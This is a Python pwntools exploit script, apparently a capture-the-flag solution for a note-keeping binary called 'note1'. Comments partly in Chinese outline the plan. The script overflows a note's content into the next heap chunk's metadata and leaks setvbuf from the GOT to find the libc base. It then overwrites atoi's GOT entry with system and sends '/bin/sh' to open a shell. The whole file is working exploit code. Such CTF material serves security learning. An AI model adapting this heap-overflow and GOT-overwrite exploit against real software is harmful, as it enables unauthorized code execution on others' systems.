#coding:utf-8
from pwn import *
e=ELF("/lib/x86_64-linux-gnu/libc.so.6")
setvbuf_off=e.symbols["setvbuf"]
system_off=e.symbols["system"]
p=process("./note1")


# struct:
# -16 prev size
# -8  size inuse
# +0  fd
# +8  bk
# +16 titles
# +80 type
# +112content
# +368 next structbegin


# 思路：
# 1. overwrite bk, leak got
# 2. overwrite atoi to system

def add(title,mytype,content):
    p.sendlineafter("option--->>",str(1))
    p.sendlineafter("Enter the title:",title)
    p.sendlineafter("Enter the type:",mytype)
    p.sendlineafter("Enter the content:",content)
    log.success("add success")
def edit(title,content):
    p.sendlineafter("option--->>",str(3))
    p.sendlineafter("title:",title)
    p.sendlineafter("content:",content)
    print p.recvuntil("success")

def dlt(title):
    p.sendlineafter("option--->>",str(4))
    p.sendlineafter("Input the note title:",title)
# RCX: 0x602020 --> 0x400706 (<__stack_chk_fail@plt+6>:	push   0x1)

add("AAAA","BBBB","CCCC")
add("AABB","BBBB","CCCC")
add("BBAACD","BBBB","CCCC")
pay="a"*(256+8)+p64(0x181)+p64(0)+p64(0x0601fb8+0x40-0x8)+"BBAACD"
edit("AABB",pay)
p.sendlineafter("option","2")
print p.recvuntil("content=")
print p.recvuntil("content=")
_setvbuf=p.recvuntil("\n")[:-1]
setvbuf=_setvbuf.ljust(8,"\00")
setvbuf=u64(setvbuf)
log.success("setvbuf is "+hex(setvbuf))
base=setvbuf-setvbuf_off
log.success("base is "+hex(base))
system=base+system_off
log.success("system is "+hex(system))


#区分清楚程序逻辑！
add("KKII","KKPP","KKO")
add("LLKKII","LLKKPP","LKKOO")
print "addddddd done!"
pay="a"*(256+8)+p64(0x181)+p64(0)+p64(0x0601fb8+0x40-0x8)+"BBAACD"
edit("KKII",pay)
# raw_input("xxxxxxxxxxxx")
edit(p64(0x000601e28),p64(setvbuf)+p64(system))
p.sendlineafter("option--->>","/bin/sh")

log.success("ok,get shell !!...")
p.interactive()
#linker beginner: 0x00006020B0
